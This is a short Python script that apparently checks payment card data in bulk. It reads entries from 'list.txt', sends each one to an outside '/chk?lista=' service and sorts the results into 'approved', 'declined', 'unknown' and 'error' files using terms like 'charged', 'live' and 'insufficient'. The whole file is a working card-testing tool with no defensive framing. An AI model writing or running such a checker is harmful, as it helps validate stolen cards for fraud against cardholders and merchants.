import requests
import json
import urllib.parse

INPUT_FILE = "list.txt"
BASE_URL = "https://zlatan-appsify.onrender.com/chk?lista="

approved = []
declined = []
unknown = []
errors = []

def classify(msg: str):
    msg = msg.lower()

    if "approve" in msg or "success" in msg or "charged" in msg or "live" in msg:
        return "approved"

    if "declined" in msg or "dead" in msg or "insufficient" in msg or "incorrect" in msg:
        return "declined"

    return "unknown"


with open(INPUT_FILE, "r", encoding="utf-8") as f:
    lines = f.read().splitlines()


for line in lines:
    if not line.strip():
        continue

    url = BASE_URL + urllib.parse.quote(line)

    try:
        r = requests.get(url, timeout=15)
        data = r.json()

        response_msg = data.get("Response", {}).get("message", "No response message")
        category = classify(response_msg)

        record = f"{line} | {response_msg}"

        if category == "approved":
            approved.append(record)
            print(f"[APPROVED] {record}")

        elif category == "declined":
            declined.append(record)
            print(f"[DECLINED] {record}")

        else:
            unknown.append(record)
            print(f"[UNKNOWN] {record}")

    except json.JSONDecodeError:
        errors.append(line + " | Invalid JSON")
        print(f"[ERROR] Invalid JSON for: {line}")

    except Exception as e:
        errors.append(line + f" | {str(e)}")
        print(f"[ERROR] {line} -> {e}")


# ✅ Save files
open("approved.txt", "w", encoding="utf-8").write("\n".join(approved))
open("declined.txt", "w", encoding="utf-8").write("\n".join(declined))
open("unknown.txt", "w", encoding="utf-8").write("\n".join(unknown))
open("error.txt", "w", encoding="utf-8").write("\n".join(errors))


print("\n✅ DONE CHECKING")
print(f"Approved: {len(approved)}")
print(f"Declined: {len(declined)}")
print(f"Unknown: {len(unknown)}")
print(f"Errors: {len(errors)}")
